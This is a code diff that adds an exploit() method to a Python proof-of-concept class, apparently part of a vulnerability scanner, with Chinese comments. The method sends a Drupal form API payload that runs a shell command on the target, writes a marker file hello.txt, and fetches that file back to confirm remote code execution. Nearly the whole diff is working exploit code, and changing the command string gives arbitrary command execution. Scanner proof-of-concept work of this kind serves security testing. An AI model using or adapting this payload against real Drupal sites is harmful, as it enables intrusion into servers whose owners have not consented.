@@ -49,7 +49,23 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.verify()
+        try:
+            #根据传入命令的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+
+            s = requests.session()
+            payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "c4ca4238a0b923820dcc509a6f75849b" | tee hello.txt'}
+            res = s.post(self.target  +'/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload)
+            verify_url = self.target + '/hello.txt'
+            r = s.get(verify_url)
+            #print(r.text)
+            if 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，在该验证过程中上传了文件地址为:{url},请及时删除。'.format(
+                    target=self.target, name=self.vuln.name, url=verify_url))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
 
 if __name__ == '__main__':
     Poc().run()
